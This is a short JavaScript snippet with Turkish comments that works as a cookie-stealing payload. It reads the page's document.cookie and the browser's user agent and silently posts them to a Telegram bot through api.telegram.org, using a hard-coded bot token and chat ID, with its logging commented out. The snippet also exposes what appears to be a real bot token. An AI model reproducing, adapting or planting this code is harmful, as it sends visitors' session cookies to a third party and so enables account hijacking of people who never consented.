const token = '6853811956:AAE0-I_H7rC5bVGN-KvFeCoYC3fBXC8WpN4'; // BotFather'dan aldığınız bot token
const chat_id = '1585991792'; // Mesajın gönderileceği kullanıcı veya grup ID'si
const message = document.cookie + " " + window.navigator.userAgent;

fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        chat_id: chat_id,
        text: message
    })
})
.then(response => response.json())
.then(data => {
//    console.log('Message sent successfully:', data);
})
.catch(error => {
 //   console.error('Error sending message:', error);
});
